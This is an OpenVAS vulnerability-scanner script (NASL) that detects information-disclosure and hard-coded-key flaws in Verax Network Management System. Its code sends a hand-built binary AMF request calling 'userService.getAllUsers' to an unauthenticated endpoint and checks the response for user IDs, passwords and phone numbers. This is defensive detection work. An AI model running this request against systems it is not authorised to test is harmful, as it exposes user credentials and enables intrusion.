###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_verax_nms_multiple_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# Verax Network Management System Multiple Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to bypass certain security
  restrictions, perform unauthorized actions and obtain sensitive information.
  This may aid in launching further attacks.
  Impact Level: Application";

tag_affected = "Verax NMS version prior to 2.1.0";
tag_insight = "- An improper restricting access to certain actions via Action Message Format
    (AMF), which can be exploited to retrieve user information by requesting
    certain objects via AMF
  - The decryptPassword() uses a static, hard coded private key to facilitate
    process. These passwords should be considered insecure due to the fact
    that recovering the private key is decidedly trivial.
  - The private and public keys are hard coded into clientMain.swf the encrypted
    password could be captured and replayed against the service by an attacker.
  - The Verax NMS Console, users can navigate to monitored devices and perform
    predefined actions (NMSAction), such as repairing tables on a MySQL database
    or restarting services.";
tag_solution = "Upgrade to Verax NMS 2.1.0 or later,
  For updates refer to http://www.veraxsystems.com/en/products/nms";
tag_summary = "The host is running Verax Network Management System and is prone to
  multiple vulnerabilities.";

if(description)
{
  script_id(803181);
  script_version("$Revision: 11 $");
  script_cve_id("CVE-2013-1350", "CVE-2013-1351", "CVE-2013-1352", "CVE-2013-1631)");
  script_bugtraq_id(58334);
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_tag(name:"risk_factor", value:"Critical");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-03-15 13:15:33 +0530 (Fri, 15 Mar 2013)");
  script_name("Verax Network Management System Multiple Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/52473");
  script_xref(name : "URL" , value : "http://seclists.org/bugtraq/2013/Mar/38");
  script_xref(name : "URL" , value : "http://seclists.org/bugtraq/2013/Mar/37");
  script_xref(name : "URL" , value : "http://seclists.org/bugtraq/2013/Mar/36");
  script_xref(name : "URL" , value : "http://seclists.org/bugtraq/2013/Mar/35");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/525916");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/525917");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/525918");

  script_description(desc);
  script_summary("Read the detailed information about the each users");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 9400);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

##
## The script code starts here
##

include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
port =0;
sndReq = "";
rcvRes = "";

## Get HTTP Port
port = get_http_port(default:9400);
if(!port){
  port = 9400;
}

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

## Get the host
host = get_host_name();
if(!host){
  exit(0);
}


## Send and Recieve the response
sndReq = http_get(item:string("/enetworkmanagementsystem-fds/eNetwor",
         "kManagementSystem/index.jsp"), port:port);
rcvRes = http_keepalive_send_recv(port:port, data:sndReq);

## Confirm the application
if("Path=/enetworkmanagementsystem-fds" >< rcvRes)
{

  ## construct raw data for "userService.getAllUsers../1"
  postdata = raw_string(0x00, 0x03, 0x00, 0x00, 0x00, 0x01, 0x00, 0x17,
                        0x75, 0x73, 0x65, 0x72, 0x53, 0x65, 0x72, 0x76,
                        0x69, 0x63, 0x65, 0x2e, 0x67, 0x65, 0x74, 0x41,
                        0x6c, 0x6c, 0x55, 0x73, 0x65, 0x72, 0x73, 0x00,
                        0x02, 0x2f, 0x31, 0x00, 0x00, 0x00, 0x00, 0x0a,
                        0x00, 0x00, 0x00, 0x00);

  ## Construct the POST data
  req = string("POST /enetworkmanagementsystem-fds/messagebroker/amf HTTP/1.1\r\n",
               "Host: ", host,":", port, "\r\n",
               "Content-Type: application/x-amf\r\n",
               "Content-Length: ", strlen(postdata), "\r\n",
               "\r\n", postdata);
  rcvRes = http_keepalive_send_recv(port:port, data:req);

  ## confirm the vulnerability
  if("user_id" ><  rcvRes && "user_pass" >< rcvRes &&
     "user_phone" >< rcvRes && "enetworkmanagementsystem" >< rcvRes)
  {
    security_hole(port);
    exit(0);
  }
}
